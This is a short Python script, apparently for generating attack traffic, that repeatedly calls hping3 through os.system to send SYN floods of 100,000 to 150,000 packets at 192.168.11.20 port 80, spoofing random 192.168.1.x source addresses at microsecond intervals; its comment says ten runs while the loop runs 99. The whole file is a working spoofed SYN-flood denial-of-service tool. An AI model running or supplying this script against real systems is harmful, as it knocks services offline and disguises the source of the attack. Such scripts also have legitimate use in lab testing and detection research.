import random;
import os;


# 10 times Syn attack
for i in range(1, 100):
    ip = random.randint(1, 250)
    pktCnt = random.randint(100000, 150000)
    realIp = "192.168.1." + str(ip)
    rate = 10 ** random.randint(1, 2)
    cmd = "hping3 -c " + str(pktCnt) + " -S -p 80 -a " + realIp + " 192.168.11.20 -i u" + str(rate)
    os.system(cmd)
    print(cmd)
